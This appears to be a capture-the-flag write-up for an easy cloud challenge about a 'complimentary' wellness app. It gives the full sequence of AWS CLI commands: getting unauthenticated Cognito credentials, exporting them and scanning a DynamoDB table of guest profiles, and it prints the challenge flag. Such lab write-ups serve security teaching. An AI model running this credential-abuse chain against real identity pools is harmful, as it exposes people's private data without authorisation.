# Synopsis
🛎️ Concierge Briefing
Lambo installed the Byte Lotus Wellness app the day she arrived — it was free, it had great reviews (written by the app, but she didn't check), and it got her a tote bag for saying yes to camera, mic, contacts, and location access. No account needed. No login screen. It just… knows things about you the moment you open it.

That's the whole pitch: “complimentary” access, no friction, no sign-up. Something still has to be deciding what you're allowed to see, even without a login — and whatever that something is, it isn't checking very carefully.

Your objective: find out how the app knows anything about you at all, and see what else it's willing to hand over.


# Rating 
Easy

# Method of Solve

first using command 


```
aws cognito-identity get-id  --identity-pool-id us-east-1:836c0949-292d-485b-b532-52d5ca7bb688  --region us-east-1
```
We get the following response 
**{
    "IdentityId": "us-east-1:4d571309-b0bb-cec6-5a5a-7d508a3acdc9"} **

We then run the following command
```
aws cognito-identity get-credentials-for-identity --identity-id "us-east-1:4d571309-b0bb-cec6-5a5a-7d508a3acdc9" --region us-east-1 > creds.json
```
from here we export all these to our AWS-CLI 
```
export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' creds.json)
export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretKey' creds.json)
export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' creds.json)
```

from here running 
```
aws sts get-caller-identity --region us-east-1
```
{
    "UserId": "AROAU2VYTBGYCEB4JME2S:CognitoIdentityCredentials",
    "Account": "332173347248",
    "Arn": "arn:aws:sts::332173347248:assumed-role/complimentary-cognito-unauth-role/CognitoIdentityCredentials"
we then run 
```
aws dynamodb scan --table-name complimentary-GuestWellnessProfiles --region us-east-1
```
This allows us to attempt to scan every item in the table. 

doing this we see the flag

 **THM{fr33_app_fr33_d4t4!}**
